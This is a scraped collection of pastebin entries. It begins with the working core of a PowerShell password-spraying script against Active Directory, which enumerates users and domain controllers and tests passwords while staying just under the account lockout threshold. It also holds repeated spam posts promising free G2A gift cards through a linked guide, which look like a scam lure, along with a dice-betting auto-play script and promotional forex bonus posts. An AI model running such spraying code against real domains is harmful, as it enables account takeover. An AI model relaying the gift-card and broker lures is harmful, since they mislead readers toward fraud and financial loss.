            $counttouse = $maxbadpwdcount - 2 # We have to use <= in our LDAP query. Use - 2 attempts to ensure the accounts are not locked with this attempt.
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(badPwdCount<=$counttouse)(!userAccountControl:1.2.840.113556.1.4.803:=2))"" #UAC = enabled accounts only
            $search.PageSize = 10
            $foundusers = $search.FindAll()
            if ($foundusers -ne $null)
            {
                foreach ($u in $foundusers)
                {
                    $users.Add([string]$u.Properties['samaccountname']) | Out-Null
                }
            }
            return $users
        }

        function Get-DomainControllers
        {
            $dcs = New-Object System.Collections.ArrayList
            $filter = ""(&(objectclass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))""
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$pdc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = $filter
            $search.PropertiesToLoad.Add('CN') | Out-Null
            $results = $search.FindAll()
            foreach ($item in $results)
            {
                $dcs.Add($item.Properties['cn']) | Out-Null
            }
            $search = $null
            $de.Dispose()
            return $dcs
        }

        function Get-DCBadPwdCount($userid, $dc)
        {
            $count = -1
            $de = New-Object System.DirectoryServices.DirectoryEntry ""LDAP://$dc""
            $search = New-Object System.DirectoryServices.DirectorySearcher $de
            $search.Filter = ""(&(objectclass=user)(samaccountname=$userid))""
            $search.PropertiestoLoad.Add('badPwdCount') | Out-Null
            $user = $search.FindOne()
            if ($user -ne $null)
            {
                $count = $user.Properties['badpwdcount']
            }
            $search = $null
            $de.Dispose()
            return $count
        }

        function Get-UserBadPwdCount($userid, $dcs)
        {
            # The badPwdCount attribute is not replicated. Attempts should be reported back to the PDC,
            # but here get the greatest count from amongst all the DCs to guard against replication errors.
            $totalbadcount = -1
            foreach ($dc in $dcs)
            {
                $badcount = Get-DCBadPwdCount $userid $dc
                if ($badcount -gt $totalbadcount)
                {
                    $totalbadcount = $badcount
                }
            }
            return $totalbadcount
        }
    }

    Process
    {
        $validaccounts = @{}

        $userstotest = $null
        Write-Host ""`n[*] Performing prereq checks.""
        if ([String]::IsNullOrEmpty($UserList) -eq $false)
        {
            if ([System.IO.File]::Exists($UserList) -eq $false)
            {
                ""[!] $UserList not found. Aborting.`n""
                exit
            }
            else
            {
                $userstotest = Get-Content $UserList
            }
        }

        $pdc = Get-PDCe

        if ($pdc -eq $null)
        {
            Write-Host ""[!] Could not locate domain controller. Aborting.""
            exit
        }

        Write-Host ""[*] PDC: $pdc""
        Write-Host ""[*] Passwords to test: $PasswordList""

        $dcs = Get-DomainControllers
        $ContextType = [System.DirectoryServices.AccountManagement.ContextType]::Domain
        $PrincipalContext = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ContextType, $pdc)

        $pwds = New-Object System.Collections.ArrayList
        foreach ($pwd in $PasswordList.Split(','))
        {
            $pwds.Add($pwd.Trim(' ')) | Out-Null
        }

        Write-Host ""[*] Initiating brute. Unless -ShowVerbose was specified, only successes will show...""
        foreach ($p in $pwds)
        {
            if ($userstotest -eq $null)
            {
                $userstotest = Get-UserList $LockoutThreshold
            }

            foreach ($u in $userstotest)
            {
                $userid = $u.Trim(' ').Trim([Environment]::Newline)
                if ($validaccounts.ContainsKey($userid) -eq $false)
                {
                    $attempts = Get-UserBadPwdCount $userid $dcs
                    
                    #Be sure to use 2 less than the LockoutThresold so the account will not be locked out as a result of the next test.
                    if ($attempts -ne -1 -and $attempts -le ($LockoutThreshold - 2)) 
                    {
                        $IsValid = $false
                        $IsValid = $PrincipalContext.ValidateCredentials($userid, $p).ToString()

                        if ($IsValid -eq $True)
                        {
                            Write-Host ""[+] Success! Username: $userid. Password: $p""
                            $validaccounts.Add($userid, $p)
                            if ($StopOnSuccess.IsPresent)
                            {
				Write-Host ""[*] StopOnSuccess. Exiting.`n""
                                exit
                            }
                        }
                        else
                        {
                            if ($ShowVerbose.IsPresent)
                            {
                                Write-Host ""[-] Failed. Username: $userid. Password: $p. BadPwdCount: $($attempts + 1)""
                            }
                        }

                        if ($Delay)
                        {
                            Start-Sleep -m $Delay
                        }
                        else
                        {
                            Start-Sleep -m 100
                        }
                    }
                    else
                    {
                        if ($ShowVerbose.IsPresent)
                        {
                            Write-Host ""[-] Skipped. Username: $userid. Password: $p. BadPwdCount: $attempts""
                        }
                    }
                }
            }
        }
        Write-Host ""[*] Completed.`n""
    }
}
"
52gq5HX7,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,vivek599,JavaScript,Sunday 2nd of June 2024 05:03:17 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
D03phCiW,ü§ëG2A.com Free Gift Card Guide June 2024 FixüéÅ,ColtM4A2,JavaScript,Sunday 2nd of June 2024 04:38:16 PM CDT,"G2A.com free voucher & games guide.
Any voucher for free on G2A.com including Playstation gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
DmmzqWhY,Untitled,Mysoft,FreeBasic,Sunday 2nd of June 2024 04:37:35 PM CDT,"#include ""MyTDT\fbplay2.bas""

play ""P64""

dim as double TMR = timer
play ""L4CC""
print timer-TMR

TMR = timer
play ""L6CCC""
print timer-TMR

TMR = timer
play ""L8CCCC""
print timer-TMR

TMR = timer
play ""L16CCCCCCCC""
print timer-TMR

TMR = timer
play ""L32CCCCCCCCCCCCCCCC""
print timer-TMR

TMR = timer
play ""L64CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC""
print timer-TMR
"
MPaH3vLy,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,Skarface-MKL,JavaScript,Sunday 2nd of June 2024 04:13:13 PM CDT,"G2A.com complimentary voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
QDCK2xx0,Untitled,hiippiie,Python,Sunday 2nd of June 2024 03:50:40 PM CDT,"import asyncio
import logging
import sys

import maigret
from maigret.result import QueryStatus

logging.getLogger('asyncio').setLevel(logging.WARNING)


MAIGRET_DB_FILE = 'https://raw.githubusercontent.com/soxoj/maigret/main/maigret/resources/data.json'
TOP_SITES_COUNT = 1500 
TIMEOUT = 5 


def setup_logger(log_level, name):
    for lib in ['requests', 'urllib3']:
        logging.getLogger(lib).setLevel(logging.WARNING) # change to debug
    logger = logging.getLogger(name)
    logger.setLevel(log_level)
    return logger


async def maigret_search(username):
    logger = setup_logger(logging.WARNING, 'maigret')
    db = maigret.MaigretDatabase().load_from_path(MAIGRET_DB_FILE)
    sites = db.ranked_sites_dict(top=TOP_SITES_COUNT)

    results = await maigret.search(username=username,
                                   site_dict=sites,
                                   timeout=TIMEOUT,
                                   max_connections=5, # max concurrent connection - default is 100
                                   is_parsing_enabled=True,
                                   logger=logger,
                                   no_progressbar=True, # change to debug
                                   query_notify=None, # change to debug
                                   )
    return results


def get_maigret_data(username):
    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(maigret_search(username))

    res = {}
    for site, data in results.items():
        if data['status'].status != QueryStatus.CLAIMED:
            continue

        res[site] = data

    return res


if __name__ == '__main__':
    print(get_maigret_data('TESTUSERNAME'))
"
a8hp3yie,ü§ëG2A.com Free Gift Card Guide June 2024 FixüéÅ,thepplayz,JavaScript,Sunday 2nd of June 2024 03:48:10 PM CDT,"G2A.com free voucher & games guide.
Any gift card for free on G2A.com including Steam gift cards & anything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
y4L6Vz5b,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,sirmikey,JavaScript,Sunday 2nd of June 2024 03:23:09 PM CDT,"G2A.com complimentary gift card & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & everything else offered.
This is the most latest version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
nmdTiDbX,Unnamed Main Screen,E-Kemp,Lua,Sunday 2nd of June 2024 03:23:04 PM CDT,"modem = peripheral.wrap(""left"")
chat = peripheral.wrap(""chat_box_0"")
radar = peripheral.wrap(""radar_0"")
driveLoc = disk.getMountPath(""drive_0"")
monitor = peripheral.wrap(""top"")

players = {}

-- Render Function
function render()
  term.clear()
  term.setCursorPos(1, 1)
  print(""Welcome to >>"")
  write(""              Elli"")
  term.setTextColor(colors.purple)
  print(""OS"")
  term.setTextColor(colors.white)
  print(""\n--------------\n"")
  print(""Players present:"")
  if next(players) ~= nil then
    local day = os.day()
    for k, v in pairs(players) do
      print(""   > ""..v.name)
    end
  else
    print(""    None"")
  end
  print(""\n--------------\n"")
end

function monitor_render()
  local x, y = monitor.getSize()

  monitor.clear()
  monitor.setTextScale(0.5)
  monitor.setCursorPos(1, 1)
  monitor.write("">> Elli"")
  monitor.setTextColor(colors.purple)
  monitor.write(""OS"")
  monitor.setTextColor(colors.white)
  for i = 1, x do
    monitor.setCursorPos(i, 2)
    monitor.write(""-"")
  end
  monitor.setCursorPos(1, 4)
  monitor.write(""Players:"")
  for i, v in pairs(players) do
    monitor.setCursorPos(1, i+4)
    monitor.write(i.."": ""..v.name)
  end
end

while true do
  players = radar.getPlayers()
  monitor_render()
  render()
  os.sleep(1)
end


-- Listen for events
"
3EFptMxp,–ù–∞–±–æ—Ä —Ç–µ–∫—Å—Ç–∞ –≥–æ–ª–æ—Å–æ–º,egor230,Python,Sunday 2nd of June 2024 03:22:21 PM CDT,"'''–î–∞–Ω–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –ø—Ä–µ–¥–Ω–∞–∑–Ω–∞—á–µ–Ω –¥–ª—è —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞–Ω–∏—è —Ä–µ—á–∏ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞, –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–π –∑–∞–º–µ–Ω—ã –ø—Ä–æ–∏–∑–Ω–µ—Å–µ–Ω–Ω—ã—Ö —Å–ª–æ–≤ –Ω–∞ –∑–∞—Ä–∞–Ω–µ–µ –∑–∞–¥–∞–Ω–Ω—ã–µ –∏ –ø–æ—Å–ª–µ–¥—É—é—â–µ–π –ø–µ—á–∞—Ç–∏ —Ç–µ–∫—Å—Ç–∞ —Å –ø–æ–º–æ—â—å—é —Å–∏–º—É–ª–∏—Ä–æ–≤–∞–Ω–Ω–æ–π –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã. –û–Ω —Ç–∞–∫–∂–µ –≤–∫–ª—é—á–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—é –≤–≤–æ–¥–æ–º —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –∏ –Ω–∞—Å—Ç—Ä–æ–π–∫–æ–π —ç–∫–≤–∞–ª–∞–π–∑–µ—Ä–∞ –¥–ª—è —É–ª—É—á—à–µ–Ω–∏—è –∫–∞—á–µ—Å—Ç–≤–∞ –∑–≤—É–∫–∞.
'''
import json, os, re, subprocess, time, threading, sys, audioop
import speech_recognition as sr
from pywinauto import keyboard
from pynput.keyboard import Key, Controller
from pynput import *
class save_key:
  def __init__(self):
    self.text = """"
    self.flag = False
    self.word=[]
    self.res={}
    self.new_res={}
  def save_text(self, text):
    self.text = text
  def get_text(self):
    return self.text
  def get_flag(self):
    return self.flag

  def set_flag(self, value):
    self.flag = value

  def update_dict(self):
   data = ""/mnt/807EB5FA7EB5E954/—Å–æ—Ñ—Ç/–≤–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –º–∞—à–∏–Ω–∞/linux must have/python_linux/Project/list for replacements.json""  # —Ñ–∞–π–ª –Ω–∞—Å—Ç—Ä–æ–µ–∫.
   if os.path.exists(data):  # –µ—Å—Ç—å –ª–∏ —ç—Ç–æ—Ç —Ñ–∞–π–ª.
    with open(data, encoding=""cp1251"") as json_file:  # –∑–∞–≥—Ä—É–∑–∫–∞ –Ω–∞—Å—Ç—Ä–æ–µ–∫ –∏–∑ —Ñ–∞–π–ª–∞.
     self.res = json.load(json_file)     # –ø—Ä–æ—Ö–æ–¥–∏–º—Å—è –ø–æ –∫–∞–∂–¥–æ–º—É —ç–ª–µ–º–µ–Ω—Ç—É —Å–ª–æ–≤–∞—Ä—è
     for key in self.res.keys():    # –ï—Å–ª–∏ –∫–ª—é—á —Å–æ–¥–µ—Ä–∂–∏—Ç '*', –¥–æ–±–∞–≤–ª—è–µ–º –µ–≥–æ –≤ –Ω–æ–≤—ã–π —Å–ª–æ–≤–∞—Ä—å
      if '*' in key:
       self.new_res[key] = self.res[key]
     for key in self.new_res.keys():
      del self.res[key]

  def get_dict(self):# —Å–ª–æ–≤–∞—Ä—å –±–µ–∑ *
     return self.res

  def get_new_dict(self):# —Å–ª–æ–≤–∞—Ä—å —Å *
     return self.new_res

  def save_words(self, w):
     self.word.clear()
     for i in w:
      self.word.append(i)

  def get_words(self):
     return self.word
k=save_key()
k.update_dict()
def replace(match):
  res=k.get_dict()
  return res[match.group(0)]
class save_ln:
  def __init__(self):
    self.text = """"
  def save_text(self, text):
    self.text = text
  def get_text(self):
      return self.text
def typing_text(char1):#  delay = 0.0001  # –ó–∞–¥–∞–π—Ç–µ –∑–¥–µ—Å—å –Ω—É–∂–Ω—É—é –∑–∞–¥–µ—Ä–∂–∫—É –≤ —Å–µ–∫—É–Ω–¥–∞—Ö
  for char in char1:
    script = f'''#!/bin/bash
    word=""{char}""  # –ó–∞–¥–∞–π—Ç–µ –∑–¥–µ—Å—å –Ω—É–∂–Ω–æ–µ —Å–ª–æ–≤–æ  # –ó–∞–¥–∞–π—Ç–µ –∑–¥–µ—Å—å –Ω—É–∂–Ω—É—é –∑–∞–¥–µ—Ä–∂–∫—É –≤ —Å–µ–∫—É–Ω–¥–∞—Ö
    if [[ -z ""$word"" ]]; then
      xte ""key space""
    else
    xdotool type  ""$word""
    fi
    '''
    subprocess.call(['bash', '-c', script, '_'])

def repeat(text, k):
  k.save_text(text)
  text1=""""
  res=k.get_dict()
  k.save_words(res)
  words=k.get_words()
  for i in words:
     text = k.get_text()
     reg = r'\b' + r'\b|\b'.join([i]) + r'\b'
     text1 = re.sub(reg, replace, text)
     k.save_text(text1)
  new_res= k.get_new_dict()
  for word, i in new_res.items():
      text = k.get_text()
      pattern = re.compile(re.escape(word), re.IGNORECASE)
      text1 = pattern.sub(i, text)
      k.save_text(text1)
  return text1

# –ü–æ–¥–∞–≤–ª–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞ –æ—à–∏–±–æ–∫
class NoALSAErrorOutput:
  def __enter__(self):
    self._stderr = sys.stderr
    sys.stderr = open(os.devnull, 'w')

  def __exit__(self, exc_type, exc_val, exc_tb):
    sys.stderr.close()
    sys.stderr = self._stderr


with NoALSAErrorOutput():
  mic = sr.Microphone()

# –°–æ–∑–¥–∞–µ–º —ç–∫–∑–µ–º–ø–ª—è—Ä –∫–ª–∞—Å—Å–∞ —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞–Ω–∏—è
r = sr.Recognizer()

# –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞
mic = sr.Microphone()

# –ù–∞—á–∞–ª—å–Ω–∞—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∞ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ –¥–ª—è —Å–Ω–∏–∂–µ–Ω–∏—è —É—Ä–æ–≤–Ω—è —à—É–º–∞
with mic as source:
  r.adjust_for_ambient_noise(source)
def on_press(key):  # –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–ª–∞–≤–∏. # print(key )
 key=str(key).replace("" "","""")
 if key == ""Key.shift_r"":
   # print(""okl"")
   k.set_flag(True)
   return True
 if key == ""Key.space"":
   k.set_flag(False)
   return True
 else:
  return True
def on_release(key):
 pass
 return True
def a():
  while 1:
    with keyboard.Listener(on_release=on_release, on_press=on_press) as listener:
      listener.join()

def apply_pulseaudio_equalizer():
  # –ü—Ä–∏–º–µ–Ω–µ–Ω–∏–µ —ç–∫–≤–∞–ª–∞–π–∑–µ—Ä–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º PulseAudio
  subprocess.run(['pactl', 'load-module', 'module-equalizer-sink', 'sink_name=equalizer'])
  subprocess.run(
    ['pactl', 'load-module', 'module-ladspa-sink', 'sink_name=ladspa_equalizer', 'sink_properties=device.description=Equalized_Sink', 'master=equalizer', 'plugin=mbeq_1197',
     'label=mbeq', 'control=6.0,6.0,4.5,0.0,0.0,0.0,0.0,0.0,4.5,7.0,8.5,10.0,12.0,8.5,6.0'])


# –ü–æ–¥–∞–≤–ª–µ–Ω–∏–µ –≤—ã–≤–æ–¥–∞ –æ—à–∏–±–æ–∫ ALSA
class NoALSAErrorOutput:
    def __enter__(self):
        self._stderr = sys.stderr
        sys.stderr = open(os.devnull, 'w')

    def __exit__(self, exc_type, exc_val, exc_tb):
        sys.stderr.close()
        sys.stderr = self._stderr

def get_mic_sources_pa():# –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–ø–∏—Å–∫–∞ –∏—Å—Ç–æ—á–Ω–∏–∫–æ–≤ –≤–≤–æ–¥–∞
    result = subprocess.run(['pactl', 'list', 'sources', 'short'], stdout=subprocess.PIPE)
    return result.stdout.decode()

def set_mic_volume_pa(source_name, volume_percentage):# –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞ —á–µ—Ä–µ–∑ PulseAudio
    subprocess.run(['pactl', 'set-source-volume', source_name, f'{volume_percentage}%'])

mic_sources = get_mic_sources_pa()# –ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞—Ö –≤–≤–æ–¥–∞ —Å –ø–æ–º–æ—â—å—é PulseAudio
# –ü–µ—Ä–µ–∫–ª—é—á–∏—Ç–µ—Å—å –¥–ª—è –≤–∞—à–µ–≥–æ –∏—Å—Ç–æ—á–Ω–∏–∫–∞
source_name = ""alsa_input.usb-046d_HD_Webcam_C525_79588C20-00.mono-fallback""
volume_level = 50  # –ü—Ä–æ—Ü–µ–Ω—Ç –≥—Ä–æ–º–∫–æ—Å—Ç–∏
set_mic_volume_pa(source_name, volume_level)# –£—Å—Ç–∞–Ω–æ–≤–∫–∞ —É—Ä–æ–≤–Ω—è –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞

def recognize_speech():
  with mic as source:
    while 1:
      try:
        print(""–°–∫–∞–∂–∏—Ç–µ —á—Ç–æ-–Ω–∏–±—É–¥—å..."")
        audio = r.listen(source)          # –û–±—Ä–∞–±–æ—Ç–∫–∞ –∞—É–¥–∏–æ –¥–∞–Ω–Ω—ã—Ö –∏–ª–∏ –ø–µ—Ä–µ–¥–∞—á–∞ –≤ —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞—Ç–µ–ª—å —Ä–µ—á–∏
        text = r.recognize_google(audio, language=""ru-RU"")# –†–∞—Å–ø–æ–∑–Ω–∞–µ–º —É—Å–ª—ã—à–∞–Ω–Ω–æ–µ –ø—Ä–∏ –ø–æ–º–æ—â–∏ Google Web Speech API
        text = str(text.lower()) + str("" "")
        print(text)
        if k.get_flag() == True:
          k.set_flag(False)
          text0 = text[0].upper() + text[1:]
          typing_text(text0)  #(text0)
        else:
          typing_text(text)  #(text)
      except sr.UnknownValueError:
        print(""Google Web Speech API –Ω–µ —Å–º–æ–≥ —Ä–∞—Å–ø–æ–∑–Ω–∞—Ç—å –∞—É–¥–∏–æ"")
      except sr.RequestError as e:
        print(f""Could not request results from Google Web Speech API; {e}"")

# –ó–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–∞ –¥–ª—è –Ω–µ–ø—Ä–µ—Ä—ã–≤–Ω–æ–≥–æ –ø—Ä–æ—Å–ª—É—à–∏–≤–∞–Ω–∏—è
apply_pulseaudio_equalizer()
listening_thread = threading.Thread(target=recognize_speech)
listening_thread.start()
t1 = threading.Thread(target=a)
t1.start()
while True:
  pass
"
67f9hpAB,ü§ëG2A.com Free Gift Card Guide June 2024 FixüéÅ,dustinction,JavaScript,Sunday 2nd of June 2024 02:58:08 PM CDT,"G2A.com free voucher & gaming guide.
Any gift card for free on G2A.com including Steam gift cards & all else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
WbCwRKxJ,so totally snowy,coinwalk,JavaScript,Sunday 2nd of June 2024 02:36:13 PM CDT,"var elderly = parseFloat(document.getElementById('pct_balance').value);
var belance = 0;
var greatie = elderly;
var prefit = 0.00001;
var beast = prefit;
var winnerdinner = elderly;
var wednesday = 0;
var stroke = 0;
var broke = 0;
var elven = elderly;
 
function go(){
if (greatie!=belance){
belance = document.getElementById('pct_balance').value;
if (belance>elven){
    stroke = stroke+1;
    broke  = 0;
    wednesday = wednesday+1 ;
    elven = parseFloat(belance);
}
if (belance<elven) {
    stroke = 0;
    broke = broke+1;
    elven = parseFloat(belance);
}
if (stroke==2) {
    beast = beast*2
}
if (stroke==3) {
    beast = beast*2
}
if (stroke==4) {
    beast = prefit;
    wednesday = 0;
    stroke  = 0;
}
if ((wednesday>1)&&(broke==1)) {
    beast = prefit;
    wednesday = 0;
} 
if ((wednesday<2)&&(broke>=2)) {
    beast = prefit;
    wednesday = 0;
} 
if (belance>=14400)  {
    console.log(""winner winner chicken dinner"");
    return;
} 
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
}
setTimeout(() => go(), 1);
greatie = document.getElementById('pct_balance').value;
}

go();"
8d98Qg56,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,sayid83,JavaScript,Sunday 2nd of June 2024 02:33:06 PM CDT,"G2A.com free voucher & games guide.
Any item for free on G2A.com including Steam gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
2nd of June 2024"
J08KLUQS,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,PetrikDev,JavaScript,Sunday 2nd of June 2024 02:08:05 PM CDT,"G2A.com complimentary gift card & games guide.
Any gift card for free on G2A.com including Amazon gift cards & anything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2 2024"
5pUGRBFr,Use This,qsenko1,Lua,Sunday 2nd of June 2024 02:03:24 PM CDT,"local Players = game:GetService(""Players"")
local DataStoreService = game:GetService(""DataStoreService"")
local EffectsDatastore = DataStoreService:GetDataStore(""EffectsDatastore"")

game.Players.PlayerAdded:Connect(function(Player)	
	local EffectsFolder = Instance.new(""Folder"",Player)
	EffectsFolder.Name = ""EffectsFolder""
	local EquippedDeathSounds = Instance.new(""StringValue"",Player)
	EquippedDeathSounds.Name = ""EquippedDeathSounds""
	-- Bool
	local EffectsBool = Instance.new(""BoolValue"",EffectsFolder)
	EffectsBool.Name = ""EffectsBool""
	-- Hand Trails
	local White_Trail = Instance.new(""BoolValue"",EffectsFolder)
	White_Trail.Name = ""White Trail""

	local userId = Player.UserId
	local key = ""Player_""..userId

	local success, returnValue 
	success, returnValue = pcall(EffectsDatastore.GetAsync, EffectsDatastore, key)

	if success then
		if returnValue == nil then
			returnValue = {
				White_Trail = false,
				EquippedDeathSounds = """"
			}			
		end
		-- Safety Bool
		EffectsBool.Value = true
		-- Trails
		White_Trail.Value = if returnValue.White_Trail ~= nil then returnValue.White_Trail else false
		-- Equppables
		EquippedDeathSounds.Value = if returnValue.EquippedDeathSounds ~= nil then returnValue.EquippedDeathSounds else """"
	else
		Player:Kick(""There was an error with loading your Data! Roblox's Datastore might be down,try agen later or contact us trough our Group!"")
		print(Player.Name.. "" Has a Data loading ERROR!!"")
	end

end)

game.Players.PlayerRemoving:Connect(function(Player)
	if Player.EffectsFolder:FindFirstChild(""EffectsBool"").Value == true then
		local userId = Player.UserId
		local key = ""Player_""..userId
		-- Main Values
		local equippeddeathsounds = Player.EquippedDeathSounds.Value
		-- Hand Trails
		local white_trail = Player.EffectsFolder[""White Trail""].Value

		local DataTable = {
			EquippedDeathSounds = equippeddeathsounds,
			White_Trail = white_trail,
		}

		print(DataTable)

		local success,returnValue
		success,returnValue = pcall(EffectsDatastore.UpdateAsync, EffectsDatastore, key, function()
			return DataTable
		end)

		if success  then
			print(""Effects Data Saved!"")
		else
			print(""Data Saving ERROR!!"")
		end

	end
end)"
VxTJDLCu,How Can I Maximize My Profits with the Trex Globals Credit Bonus,reviewbrokers,PHP,Sunday 2nd of June 2024 01:59:54 PM CDT,"https://www.reviewbrokers.net/how-can-i-maximize-my-profits-with-the-trex-globals-credit-bonus/
 Table of Contents: Trex Globals
1. Understanding the Trex Globals Credit Bonus
2. How to Claim Your Credit Bonus
3. Exploring Trading Opportunities with the Credit Bonus
4. Important Considerations
5. Terms and Conditions
6. Conclusion
Understanding the Trex Globals Credit Bonus
The Trex Globals Credit Bonus is a straightforward yet powerful offer that grants you a 50% credit bonus on top of your deposit amount. Imagine depositing $100 and receiving an additional $50 bonus, instantly boosting your account balance to $150. This extra credit serves as a catalyst for expanding your trading volume and potentially increasing your profits.
How to Claim Your Credit Bonus

 	
Register a new account:
Begin your trading journey with Trex Globals by signing up for a new account. The registration process is quick and seamless, ensuring you can start trading in no time.
 	
Complete the verification:
Prioritize the security of your account by completing the verification process. This step ensures the safety of your funds and provides peace of mind as you engage in trading activities.
 	
Receive the Credit Bonus 50%:
Once your account is verified, the 50% credit bonus will be automatically credited to your account. There's no waiting period‚Äîyour bonus is ready to be utilized immediately.

Exploring Trading Opportunities with the Credit Bonus
The versatility of the bonus extends across various financial instruments, including forex, commodities, indices, and cryptocurrencies. Whether you're interested in currency pairs, precious metals, or digital assets, the credit bonus empowers you to explore diverse trading opportunities and implement various strategies.
Important Considerations

 	
Limited time offer:
The Trex Globals Credit Bonus is available for a limited time, adding a sense of urgency to this enticing offer.
 	
Withdrawal conditions:
The bonus can be withdrawn only upon generating profits. In the event of losses, the bonus amount will be deducted from your account balance, incentivizing responsible trading practices.

Terms and Conditions
It's crucial to familiarize yourself with the terms and conditions associated with the credit bonus:

 	
General terms and conditions:
The bonus is subject to the overarching terms and conditions of Trex Globals, ensuring fairness and transparency.
 	
Trex Globals' prerogative:
Trex Globals reserves the right to modify or terminate the promotion at its discretion, emphasizing the importance of staying informed.

Conclusion
The Trex Globals Credit Bonus presents a compelling opportunity to enhance your trading journey. By augmenting your initial investment with a 50% credit bonus, Trex Globals enables you to expand your trading horizons and pursue greater profits. However, it's essential to approach this bonus with a clear understanding of its terms and conditions, ensuring a positive and rewarding trading experience.

Don't miss out on the chance to elevate your trading experience with the Trex Globals Credit Bonus. Sign up today and seize the benefits while they last!"
FcGGJziv,ü§ëG2A.com Free Gift Card Guide June 2024 Fixü§ë,x3kiN,JavaScript,Sunday 2nd of June 2024 01:43:03 PM CDT,"G2A.com complimentary gift card & games guide.
Any item for free on G2A.com including Amazon gift cards & everything else offered.
This is the most up to date version of this script. Any other one posted will not work!

PDF guide here:
https://drive.google.com/file/d/1DJewb1_3bQR3RytE-84jom7JCUX91RVh/view?002

Working as of:
June 2nd 2024"
cxP97c8A,How to Participate in the Sniper Weekly Demo Contest ‚Äì InstaForex,fxvnpro,PHP,Sunday 2nd of June 2024 01:38:36 PM CDT,"https://www.fxvnpro.com/how-to-participate-in-the-sniper-weekly-demo-contest-instaforex/
 How to Participate in the Sniper Weekly Demo Contest ‚Äì InstaForex
The Sniper Weekly Demo Contest is a prestigious competition hosted by InstaForex, designed to test and reward the best trading strategies and skills. Participants have the chance to win cash prizes while showcasing their trading prowess. Here are the essential details:
Table of Contents : InstaForex

 	Contest Overview
 	Eligibility Criteria
 	Trading Conditions
 	Determining Results and Winners
 	Additional Information

Contest Overview

 	Contest Name: Sniper Weekly Demo Contest
 	Organizer: InstaForex
 	Duration: Held every week from Monday 00:00 to Friday 23:59:59 (terminal time)
 	Prize Pool: $2,000
 	Prize Distribution:

 	1st place: $700
 	2nd place: $500
 	3rd place: $400
 	4th place: $300
 	5th place: $100


 	Registration: Participants must register on the InstaForex website and open individual demo accounts for each weekly contest. Registration ends one hour before the contest starts.

Eligibility Criteria

 	Participation: Any owner of a trading account with InstaForex can participate in the contest.
 	Age Requirement: Only full-aged customers (over 18 years old) are eligible.
 	Registration Details: Participants must sign up on the InstaForex website and provide true data, including their full name and available email address.

